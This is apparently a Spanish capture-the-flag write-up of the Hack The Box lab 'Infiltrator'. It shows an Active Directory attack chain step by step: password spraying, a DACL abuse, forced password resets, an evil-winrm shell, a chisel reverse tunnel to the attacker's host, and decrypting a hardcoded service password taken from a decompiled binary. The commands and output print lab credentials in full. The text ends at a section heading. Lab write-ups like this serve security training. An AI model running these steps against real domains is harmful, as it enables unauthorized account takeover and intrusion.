WAT?watismypass! ($krb5asrep$23$l.clark@INFILTRATOR.HTB)     
1g 0:00:00:06 DONE (2025-05-20 20:02) 0.1438g/s 1511Kp/s 1511Kc/s 1511KC/s WEQ6897..WASHIDA
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
❯
```

## Services Access
Las credenciales tienen acceso a los servicios smb, ldap y rdp.
```bash
❯ netexec smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             [*] Enumerated shares
SMB         10.10.11.31     445    DC01             Share           Permissions     Remark
SMB         10.10.11.31     445    DC01             -----           -----------     ------
SMB         10.10.11.31     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.31     445    DC01             C$                              Default share
SMB         10.10.11.31     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.31     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.31     445    DC01             SYSVOL          READ            Logon server share 
❯ netexec ldap 10.10.11.31 -u l.clark -p 'WAT?watismypass!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
❯ netexec rdp 10.10.11.31 -u l.clark -p 'WAT?watismypass!'
RDP         10.10.11.31     3389   DC01             [*] Windows 10 or Windows Server 2016 Build 17763 (name:DC01) (domain:infiltrator.htb) (nla:True)
RDP         10.10.11.31     3389   DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
❯
```
Encontramos en la descripcion de K.turner lo que parece ser una contrasena, sin embargo no permite el acceso a ningun servicio.
```bash
❯ netexec smb 10.10.11.31 -u l.clark -p 'WAT?watismypass!' --users
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB         10.10.11.31     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.11.31     445    DC01             Administrator                 2024-08-21 19:58:28 0       Built-in account for administering the computer/domain 
SMB         10.10.11.31     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.11.31     445    DC01             krbtgt                        2023-12-04 17:36:16 0       Key Distribution Center Service Account 
SMB         10.10.11.31     445    DC01             D.anderson                    2023-12-04 18:56:02 0        
SMB         10.10.11.31     445    DC01             L.clark                       2023-12-04 19:04:24 0        
SMB         10.10.11.31     445    DC01             M.harris                      2025-05-28 00:31:43 0        
SMB         10.10.11.31     445    DC01             O.martinez                    2024-02-25 15:41:03 0        
SMB         10.10.11.31     445    DC01             A.walker                      2023-12-05 22:06:28 0        
SMB         10.10.11.31     445    DC01             K.turner                      2024-02-25 15:40:35 0       MessengerApp@Pass! 
SMB         10.10.11.31     445    DC01             E.rodriguez                   2025-05-28 00:31:43 0        
SMB         10.10.11.31     445    DC01             winrm_svc                     2024-08-02 22:42:45 0        
SMB         10.10.11.31     445    DC01             lan_managment                 2024-08-02 22:42:46 0        
SMB         10.10.11.31     445    DC01             [*] Enumerated 12 local users: INFILTRATOR
❯ netexec smb 10.10.11.31 -u K.turner -p 'MessengerApp@Pass!'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\K.turner:MessengerApp@Pass! STATUS_LOGON_FAILURE 
❯
```

## Bloodhound & Analysis
Ejecutamos bloodhound-ce con las credenciales de l.clark.
```bash
❯ ~/htb/tools/bloodhound-ce/bloodhound.py -u l.clark -p 'WAT?watismypass!' -ns 10.10.11.31 -d infiltrator.htb -c All --zip
INFO: BloodHound.py for BloodHound Community Edition
INFO: Found AD domain: infiltrator.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.infiltrator.htb
INFO: Found 14 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc01.infiltrator.htb
INFO: Done in 00M 50S
INFO: Compressing output into 20250520200947_bloodhound.zip
❯
```
Creamos un wordlist basado en la lista de usuarios de bloodhound para usarlos posteriormente.
```bash
❯ unzip 20250520200947_bloodhound.zip 20250520200947_users.json
Archive:  20250520200947_bloodhound.zip
 extracting: 20250520200947_users.json  
❯ jq -r '.data[].Properties.name' 20250520200947_users.json| tail -n +2 |  awk '{ print tolower($0) }' | cut -d '@' -f1 > users.txt
❯ wc -l users.txt
13 users.txt
❯ cat users.txt
lan_managment
infiltrator_svc$
winrm_svc
e.rodriguez
k.turner
a.walker
o.martinez
m.harris
l.clark
d.anderson
krbtgt
guest
administrator
❯
```

#### Users
En total encontramos 11 usuarios que pertenece a `Domain Users`.

2025_20222272511.png[IMAGE]

#### l.clark
l.clark unicamente muestra el grupo `marketing_team` como el mas destacado.

2025_20222274642.png[IMAGE]

Otro miembro de este grupo es **D.anderson**.

2025_20222274904.png[IMAGE]

#### D.anderson
D.anderson tambien pertence al grupo `Protected Users`, por lo que al tener de tener acceso a este usuario seria unicamente por Kerberos.

2025_20222275014.png[IMAGE]

Tiene permisos `GenericAll` sobre el OU `Marketing Digital` y este ultimo contiene al usuario **E.rodriguez** por lo que seria posible acceder a este.

2025_20222275237.png[IMAGE]

#### E.rodriguez
E.rodriguez puede agregarse a si mismo al grupo `Chiefs Marketing` con ello realizar el cambio de contrasena de **M.Harris**.

2025_20222275602.png[IMAGE]

#### M.Harris
M.harris pertence al grupo Developers. Tambien se muestra `Protected Users` y `Remote Management Users`, estos dos ultimos indican acceso por WinRM mediante Kerberos. 

2025_20222275831.png[IMAGE]

#### winrm_svc
El usuario winrm_svc es otro de los miembros de `Remote Management Users` por lo que tiene acceso a WinRM, en este caso con contrasena.

2025_20222272702.png[IMAGE]

#### O.martinez & A.walker
O.martinez pertenece al grupo de `Remote Desktop Users` lo que le permite acceder por RDP.

2025_20222273127.png[IMAGE]

Tambien al grupo `Chiefs Marketing` que permite realizar el cambio de contrasena a **M.harris**.

2025_20222273253.png[IMAGE]

Al igual que o.martinez A.walker puede realizar el cambio de contrasena.

2025_20222273429.png[IMAGE]

#### lan_managment
lan_managment puede realizar la lectura de contrasena `GMSA` de **infiltrator_svc$**.

2025_20222273718.png[IMAGE]


# User - D.anderson
## Password Spraying
Ejecutamos netexec con la lista de usuarios y la unica contrasena conocida, encontramos que D.anderson comparte la contrasena con l.clark.
```bash
❯ netexec smb 10.10.11.31 -u users.txt -p 'WAT?watismypass!' --continue-on-success | grep +
SMB                      10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
❯ netexec smb 10.10.11.31 -u users.txt -p 'WAT?watismypass!' -k --continue-on-success | grep +
SMB                      10.10.11.31     445    DC01             [+] infiltrator.htb\l.clark:WAT?watismypass! 
SMB                      10.10.11.31     445    DC01             [+] infiltrator.htb\d.anderson:WAT?watismypass! 
❯
```

## GenericAll -> Marketing Digital
Para abusar de GenericAll sobre Marketing Digital iniciamos solicitando un ticket con `getTGT`. 
```bash
❯ getTGT.py -dc-ip 10.10.11.31 infiltrator.htb/d.anderson:'WAT?watismypass!'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in d.anderson.ccache
❯ export KRB5CCNAME='d.anderson.ccache'
❯
```

Ejecutamos `dacledit` para darle FullControl a d.anderson sobre `OU Marketing Digital`.
```bash
❯ impacket-dacledit -dc-ip 10.10.11.31 -k -no-pass -action write -rights FullControl -inheritance -principal d.anderson -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' infiltrator.htb/d.anderson
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20250520-222910.bak
[*] DACL modified successfully!
❯
```

## Change Password - E.rodriguez
El OU contiene a E.Rodriguez por lo que es posible realizar el cambio de contrasena. Realizamos el cambio con `bloodyAD` especificando autenticacion kerberos.
```bash
❯ ~/htb/tools/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" -u "d.anderson" -k set password "E.rodriguez" "5upper@338"
[+] Password changed successfully!
❯
```
# User - E.rodriguez
Confirmamos que la contrasena permite el acceso por smb y ldap.
```bash
❯ netexec smb 10.10.11.31 -u E.rodriguez -p '5upper@338' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\E.rodriguez:5upper@338 
SMB         10.10.11.31     445    DC01             [*] Enumerated shares
SMB         10.10.11.31     445    DC01             Share           Permissions     Remark
SMB         10.10.11.31     445    DC01             -----           -----------     ------
SMB         10.10.11.31     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.31     445    DC01             C$                              Default share
SMB         10.10.11.31     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.31     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.31     445    DC01             SYSVOL          READ            Logon server share 
❯ netexec ldap 10.10.11.31 -u E.rodriguez -p '5upper@338'
LDAP        10.10.11.31     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
LDAP        10.10.11.31     389    DC01             [+] infiltrator.htb\E.rodriguez:5upper@338 
❯
```

## Addself -> Chiefs Marketing
E.rodriguez puede agregarse al grupo Chiefs Marketing, ejecutamos bloodyAD para lograrlo.
```bash
❯ ~/htb/tools/bloodyAD/bloodyAD.py --host "10.10.11.31" -d "infiltrator.htb" -u "E.rodriguez" -p "5upper@338" add groupMember "Chiefs Marketing" "E.rodriguez"
[+] E.rodriguez added to Chiefs Marketing
❯
```
## ForceChangePassword -> M.Harris
Realizamos el cambio de contrasena de M.Harris utilizando `net`. M.harris al pertenecer al grupo de Protected Users puede autenticarse por kerberos.
```bash
❯ net rpc password "M.Harris" "newP@ssword2025" -U "infiltrator.htb"/"E.rodriguez"%"5upper@338" -S "10.10.11.31"
❯ netexec smb 10.10.11.31 -u M.Harris -p 'newP@ssword2025'
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\M.Harris:newP@ssword2025 STATUS_ACCOUNT_RESTRICTION 
❯ netexec smb 10.10.11.31 -u M.Harris -p 'newP@ssword2025' -k
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\M.Harris:newP@ssword2025 
❯
```
# User - M.harris
M.harris puede acceder al servicio WinRM por Kerberos, solicitamos un ticket.
```bash
❯ getTGT.py -dc-ip 10.10.11.31 infiltrator.htb/M.Harris:'newP@ssword2025'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in M.Harris.ccache
❯ 
❯ export KRB5CCNAME='M.Harris.ccache'
❯
```
Modificamos el archivo `/etc/krb5.conf` con la configuracion para la maquina.
```bash
❯ cat /etc/krb5.conf
[libdefaults]
        default_realm = INFILTRATOR.HTB
        dns_lookup_realm = false
        dns_lookup_kdc = false

[realms]
        INFILTRATOR.HTB = {
                kdc = dc01.infiltrator.htb
                admin_server = dc01.infiltrator.htb
                default_domain = infiltrator.htb
        }

[domain_realm]
        INFILTRATOR.htb = INFILTRATOR.HTB
        .INFILTRATOR.htb = INFILTRATOR.HTB
❯ 
```
Ejecutamos `evil-winrm` logrando obtener una shell como M.harris y acceso a la flag `user.txt`.
```bash
❯ evil-winrm -i dc01.infiltrator.htb -r INFILTRATOR.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\M.harris\Documents> whoami
infiltrator\m.harris
*Evil-WinRM* PS C:\Users\M.harris\Documents> cat ../Desktop/user.txt
4fba3cc5848d2931c44b4a19b541fafd
*Evil-WinRM* PS C:\Users\M.harris\Documents>
```


# Output Messenger
Tras enumerar los directorios descubrimos que existe y esta en ejecucion tanto cliente como servidor de [Output Messenger](https://www.outputmessenger.com/).
```bash
*Evil-WinRM* PS C:\Program Files> dir -force


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        12/4/2023   9:22 AM                Common Files
d-----        8/21/2024   1:50 PM                Hyper-V
d-----        2/19/2024   3:52 AM                internet explorer
d-----        2/23/2024   5:06 AM                Output Messenger
d-----        5/27/2025   5:43 PM                Output Messenger Server
d-----       12/12/2023  10:04 AM                PackageManagement
d--h--        12/4/2023   9:22 AM                Uninstall Information
d-----        2/19/2024   4:16 AM                Update Services
d-----        12/4/2023   9:23 AM                VMware
d-r---        11/5/2022  12:03 PM                Windows Defender
d-----        8/21/2024   1:50 PM                Windows Defender Advanced Threat Protection
d-----        11/5/2022  12:03 PM                Windows Mail
d-----        8/21/2024   1:50 PM                Windows Media Player
d-----        9/15/2018  12:19 AM                Windows Multimedia Platform
d-----        9/15/2018  12:28 AM                windows nt
d-----        11/5/2022  12:03 PM                Windows Photo Viewer
d-----        9/15/2018  12:19 AM                Windows Portable Devices
d-----        9/15/2018  12:19 AM                Windows Security
d--hs-        9/15/2018  12:19 AM                Windows Sidebar
d--h--        9/15/2018  12:19 AM                WindowsApps
d-----       12/12/2023  10:04 AM                WindowsPowerShell
-a-hs-        9/15/2018  12:16 AM            174 desktop.ini


*Evil-WinRM* PS C:\Program Files> netstat -ano | findstr /v UDP |findstr 1412
  TCP    0.0.0.0:14121          0.0.0.0:0              LISTENING       1408
  TCP    0.0.0.0:14122          0.0.0.0:0              LISTENING       1408
  TCP    0.0.0.0:14123          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:14125          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:14126          0.0.0.0:0              LISTENING       6472
  TCP    0.0.0.0:14127          0.0.0.0:0              LISTENING       1408
  TCP    0.0.0.0:14128          0.0.0.0:0              LISTENING       1408
  TCP    127.0.0.1:14121        127.0.0.1:49826        ESTABLISHED     1408
  TCP    127.0.0.1:49826        127.0.0.1:14121        ESTABLISHED     6540
  TCP    [::]:14122             [::]:0                 LISTENING       1408
  TCP    [::]:14123             [::]:0                 LISTENING       4
  TCP    [::]:14125             [::]:0                 LISTENING       4
  TCP    [::]:14126             [::]:0                 LISTENING       6472
  TCP    [::]:14127             [::]:0                 LISTENING       1408
  TCP    [::]:14128             [::]:0                 LISTENING       1408
*Evil-WinRM* PS C:\Program Files>
```


Basandonos en la [documentacion](https://support.outputmessenger.com/install-output-messenger-server/#RouterConfiguration_optional) obtuvimos los puertos con [chisel](https://github.com/jpillora/chisel/releases).
```bash
*Evil-WinRM* PS C:\Program Files> cd C:/programdata
*Evil-WinRM* PS C:\programdata> mkdir temp; cd temp


    Directory: C:\programdata


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        5/27/2025   7:33 PM                temp


*Evil-WinRM* PS C:\programdata\temp> upload pivot/chisel.exe
                                        
Info: Uploading /home/kali/htb/infiltrator/pivot/chisel.exe to C:\programdata\temp\chisel.exe
                                        
Data: 11758248 bytes of 11758248 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\programdata\temp> .\chisel.exe client 10.10.14.86:9090 R:14121:localhost:14121 R:14122:localhost:14122 R:14123:localhost:14123 R:14124:localhost:14124 R:14125:localh
*Evil-WinRM* PS C:\programdata\temp> .\chisel.exe client 10.10.14.86:9090 R:14121:localhost:14121 R:14122:localhost:14122 R:14123:localhost:14123 R:14124:localhost:14124 R:14125:localhost:14125
chisel.exe : 2025/05/27 19:36:35 client: Connecting to ws://10.10.14.86:9090
    + CategoryInfo          : NotSpecified: (2025/05/27 19:3...0.10.14.86:9090:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
2025/05/27 19:36:35 client: Connected (Latency 89.1997ms)
```

```bash
❯ ./chisel server --port 9090 --reverse
2025/05/27 22:36:33 server: Reverse tunnelling enabled
2025/05/27 22:36:33 server: Fingerprint a6rii6EQ2DKQm8gZ6eUunubndCn0L2lSkUBT9rSND3E=
2025/05/27 22:36:33 server: Listening on http://0.0.0.0:9090
2025/05/27 22:36:37 server: session#1: tun: proxy#R:14121=>localhost:14121: Listening
2025/05/27 22:36:37 server: session#1: tun: proxy#R:14122=>localhost:14122: Listening
2025/05/27 22:36:37 server: session#1: tun: proxy#R:14123=>localhost:14123: Listening
2025/05/27 22:36:37 server: session#1: tun: proxy#R:14124=>localhost:14124: Listening
2025/05/27 22:36:37 server: session#1: tun: proxy#R:14125=>localhost:14125: Listening
```

## K.turner User
Tras realizar la instalacion del [cliente](https://www.outputmessenger.com/lan-messenger-downloads/) ejecutamos la aplicacion en nuestro Kali. Anteriormente encontramos lo que parece ser una contrasena para K.turner en la descripcion del usuario, utilizamos estas credenciales y especificamos el servidor local.
```bash
K.turner : MessengerApp@Pass!
```

2025_20222274355.png[IMAGE]

#### General Chat
Encontramos en el `Chat General` un mensaje indicando el uso de la version en Windows.

2025_20212203503.png[IMAGE]


#### Dev_Chat
En el chat `Dev_chat` se habla sobre una aplicacion que permita obtener informacion por **LDAP** bajo el nombre `UserExplorer.exe`. Se indica que M.harris ya implemento una funcion de desencriptado en AES, ademas su uso es a traves de una terminal, como una de las opciones: `-default`.

2025_20212204432.png[IMAGE]
2025_20212204503.png[IMAGE]
2025_20212204515.png[IMAGE]

La aplicacion no se encuentra en algun directorio que M.harris tenga acceso.
```bash
*Evil-WinRM* PS C:\ProgramData> Get-ChildItem -Path C:\ -Filter UserExplorer.exe -Recurse -ErrorAction SilentlyContinue -Force
*Evil-WinRM* PS C:\ProgramData>
```

La version de linux se muestra con muchos "glitches" y bugs al intentar cargar otros chats o funcionalidades de la aplicacion por lo que pasamos a la version de Windows.

2025_20212204053.png[IMAGE]

### Output Wall
La opcion de Output Wall realiza una solicitud hacia el puerto 14126, puerto que no especificamos en chisel.

2025_20222275930.png[IMAGE]

Ejecutamos nuevamente chisel con el puerto, sin embargo el contenido no se mostraba por lo que abrimos wireshark para observar las solicitudes HTTP, encontramos que realiza una solicitud al puerto 14126 indicando un token. Se muestra una respuesta pero la aplicacion parece no manejarla correctamente.

2025_20222271631.png[IMAGE]

Replicamos la solicitud en firefox y observamos contenido que no se muestra en la aplicacion.

2025_20213212438.png[IMAGE]

Se muestra un comentario de K.Turner donde se muestra la demo de la aplicacion donde especifica credenciales de M.harris.

2025_20213212521.png[IMAGE]

```bash
"UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris"
```

## Manually Brute Forcing
De manera manual tomamos los usuarios existentes en el chat General e intentamos autenticarnos con cada uno, realizando combinaciones `user:user` y `user:pass`, incluimos contrasenas ya conocidas, encontramos pares de credenciales aceptadas.

```bash
K.turner : MessengerApp@Pass!
D.anderson : D.anderson
A.walker : A.walker 
O.martinez : m@rtinez@1996!
m.harris : D3v3l0p3r_Pass@1337!

L.clark : WAT?watismypass!
E.rodriguez : 5upper@338 <--- password we changed earlier by d.anderson
```

### D.anderson
Se muestra con este usuario que winrm_svc reinicio su contrasena.

2025_20213213547.png[IMAGE]

### A.walker 
En el chat de Chief Marketing Chat se muestra que A.walker solicito las credenciales de O.martinez: `O.martinez : m@rtinez@1996!`.

2025_20222275600.png[IMAGE]

### O.martinez
Muestra una conversacion con winrm_svc sobre su contrasena.

2025_20213214539.png[IMAGE]

### m.harris
Con las credenciales de m.harris logramos el acceso a la output messenger, observamos la aplicacion enviada por admin en el log de mensajes.

2025_20213212759.png[IMAGE]

Encontramos el archivo en `%appdata%Output Messenger\<ID>\Received Files\202402\`.
```bash
PS C:\Users\sckull\AppData\Roaming\Output Messenger\EAAA\Received Files\202402> Get-FileHash -Path "UserExplorer.exe" -Algorithm SHA256

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          BED0592CF78A84DF52EA936D5FEE8319D028D7E97CECC4DFCEAADE4A98B52BB9       C:\Users\sckull\AppData\Roaming\Output Messenger\EAAA\Received Files\202402\UserExplorer.exe


PS C:\Users\sckull\AppData\Roaming\Output Messenger\EAAA\Received Files\202402>
```

Ademas vemos que las credenciales de M.harris son aceptadas por Kerberos.
```bash
❯ netexec smb 10.10.11.31 -u m.harris -p 'D3v3l0p3r_Pass@1337!' --continue-on-success  -k
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\m.harris:D3v3l0p3r_Pass@1337! 
❯
```

### L.clark && E.rodriguez 
En el caso de estos dos ultimos no se muestra algun log de chat interesante. En el caso de E.rodriguez es posible utilizar la contrasena que anteriormente se cambio con d.anderson.


# Application Analysis - UserExplorer.exe
La ejecucion necesita conexion con el servidor. 
```bash
PS C:\Users\sckull\AppData\Roaming\Output Messenger\EAAA\Received Files\202402> .\UserExplorer.exe -u m.harris -p D3v3l0p3r_Pass@1337! -s M.harris
Attempting Service Connection...
Service Connection Successful.
Search for M.harris user...
An error occurred: El servidor no es funcional.

PS C:\Users\sckull\AppData\Roaming\Output Messenger\EAAA\Received Files\202402>
```

## Decompile - ILSpy
Ejecutamos [ILSpy](https://github.com/icsharpcode/ILSpy) y cargamos el ejecutable. Encontramos que existe la clase `Decryptor` que utiliza AES.

2025_20213213921.png[IMAGE]

{{< expand "Expand me" >}}
```c#
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public class Decryptor
{
	public static string DecryptString(string key, string cipherText)
	{
		using Aes aes = Aes.Create();
		aes.Key = Encoding.UTF8.GetBytes(key);
		aes.IV = new byte[16];
		ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
		using MemoryStream stream = new MemoryStream(Convert.FromBase64String(cipherText));
		using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		using StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}
}

```
{{< /expand >}}

En la clase `LdapApp` funcion Main encontramos el usuario winrm_svc un cifrado junto con la key.

2025_20213214033.png[IMAGE]


{{< expand "Expand me" >}}
```c#
using System;
using System.DirectoryServices;

internal class LdapApp
{
	private static void Main(string[] args)
	{
		string path = "LDAP://dc01.infiltrator.htb";
		string text = "";
		string text2 = "";
		string text3 = "";
		string text4 = "winrm_svc";
		string cipherText = "TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=";
		for (int i = 0; i < args.Length; i += 2)
		{
			switch (args[i].ToLower())
			{
			case "-u":
				text = args[i + 1];
				break;
			case "-p":
				text2 = args[i + 1];
				break;
			case "-s":
				text3 = args[i + 1];
				break;
			case "-default":
				text = text4;
				text2 = Decryptor.DecryptString("b14ca5898a4e4133bbce2ea2315a1916", cipherText);
				break;
			default:
				Console.WriteLine($"Invalid argument: {args[i]}");
				return;
			}
		}
		if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(text3))
		{
			Console.WriteLine("Usage: UserExplorer.exe -u <username> -p <password>  -s <searchedUsername> [-default]");
			Console.WriteLine("To use the default credentials: UserExplorer.exe -default -s userToSearch");
			return;
		}
		try
		{
			Console.WriteLine("Attempting Service Connection...");
			DirectoryEntry directoryEntry = new DirectoryEntry(path, text, text2);
			try
			{
				Console.WriteLine("Service Connection Successful.");
				DirectorySearcher directorySearcher = new DirectorySearcher(directoryEntry);
				try
				{
					directorySearcher.Filter = $"(SAMAccountName={text3})";
					Console.WriteLine($"Search for {text3} user...");
					SearchResult searchResult = directorySearcher.FindOne();
					if (searchResult != null)
					{
						Console.WriteLine("User found. Details:");
						DirectoryEntry directoryEntry2 = searchResult.GetDirectoryEntry();
						Console.WriteLine(string.Format("Name: {0}", directoryEntry2.Properties["cn"].Value));
						Console.WriteLine(string.Format("EmailID: {0}", directoryEntry2.Properties["mail"].Value));
						Console.WriteLine(string.Format("Telephone Extension: {0}", directoryEntry2.Properties["telephoneNumber"].Value));
						Console.WriteLine(string.Format("Department: {0}", directoryEntry2.Properties["department"].Value));
						Console.WriteLine(string.Format("Job Title: {0}", directoryEntry2.Properties["title"].Value));
					}
					else
					{
						Console.WriteLine("User not found.");
					}
				}
				finally
				{
					((IDisposable)directorySearcher)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)directoryEntry)?.Dispose();
			}
		}
		catch (Exception ex)
		{
			Console.WriteLine($"An error occurred: {ex.Message}");
		}
	}
}
```
{{< /expand >}}

## Decipher Password 
Utilizamos el mismo codigo para obtener la contrasena.

2025_20214220532.png[IMAGE]

{{< expand "Expand me" >}}
```c#
using System.Security.Cryptography;
using System.Text;

class Program
{
    public static string DecryptString(string key, string cipherText)
    {
        using Aes aes = Aes.Create();
        aes.Key = Encoding.UTF8.GetBytes(key);
        aes.IV = new byte[16];
        ICryptoTransform transform = aes.CreateDecryptor(aes.Key, aes.IV);
        using MemoryStream stream = new MemoryStream(Convert.FromBase64String(cipherText));
        using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
        using StreamReader streamReader = new StreamReader(stream2);
        return streamReader.ReadToEnd();
    }
    static void Main(string[] args)
    {        
        string pass = DecryptString("b14ca5898a4e4133bbce2ea2315a1916", "TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=");
        Console.WriteLine("The password is: " + pass);
        Console.WriteLine("Press ENTER to exit...");
        Console.ReadLine();
    }

}
```
{{< /expand >}}


Intentamos utilizar el valor retornado como contrasena pero parece no ser valida.
```bash
❯ netexec smb 10.10.11.31 -u winrm_svc -p 'SKqwQk81tgq+C3V7pzc1SA==' -k --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [-] infiltrator.htb\winrm_svc:SKqwQk81tgq+C3V7pzc1SA== KDC_ERR_PREAUTH_FAILED 
❯
```

Encontramos que el cifrado es doble, por lo que ejecutamos nuevamente el codigo.
```c#
static void Main(string[] args)
    {        
        string pass = DecryptString("b14ca5898a4e4133bbce2ea2315a1916", "TGlu22oo8GIHRkJBBpZ1nQ/x6l36MVj3Ukv4Hw86qGE=");
        pass = DecryptString("b14ca5898a4e4133bbce2ea2315a1916", pass);
        Console.WriteLine("The password is: " + pass);
        Console.WriteLine("Press ENTER to exit...");
        Console.ReadLine();
    }
```

Esta vez parece mas una contrasena sin el cifrado.

2025_20214221546.png[IMAGE]

Confirmamos que es funcional con el usuario winrm_svc.
```bash
❯ netexec smb 10.10.11.31 -u winrm_svc -p 'WinRm@$svc^!^P' --shares
SMB         10.10.11.31     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:infiltrator.htb) (signing:True) (SMBv1:False) 
SMB         10.10.11.31     445    DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P 
SMB         10.10.11.31     445    DC01             [*] Enumerated shares
SMB         10.10.11.31     445    DC01             Share           Permissions     Remark
SMB         10.10.11.31     445    DC01             -----           -----------     ------
SMB         10.10.11.31     445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.31     445    DC01             C$                              Default share
SMB         10.10.11.31     445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.31     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.10.11.31     445    DC01             SYSVOL          READ            Logon server share 
❯ netexec winrm 10.10.11.31 -u winrm_svc -p 'WinRm@$svc^!^P' 2>/dev/null
WINRM       10.10.11.31     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:infiltrator.htb)
WINRM       10.10.11.31     5985   DC01             [+] infiltrator.htb\winrm_svc:WinRm@$svc^!^P (Pwn3d!)
❯
```

## winrm_svc - Messenger Output
Encontramos una API KEY en las notas de la aplicacion compartida por Admin.

2025_20214224925.png[IMAGE]

```bash
lan_managment  api key 558R501T5I6024Y8JV3B7KOUN1A518GG
```

Intentamos interactuar con la API siguiendo la [documentacion](https://support.outputmessenger.com/user-api/) pero parece ser que es una KEY con limitaciones por lo que no permite ir mas alla de listar usuarios, chats y grupos.
```bash
❯ curl -s  -X PUT http://localhost:14125/api/users/D.anderson -d "username=D.anderson&displayname=D.anderson&group=Administration&email=lucy@xcompany.com&phone=04562272323&previous_password=D.anderson&password=D.anderson" -H "API-KEY: 558R501T5I6024Y8JV3B7KOUN1A518GG" | jq
{
  "Message": "No permissoin to access."
}
❯
```

# O.Martinez via Output Messenger Calendar
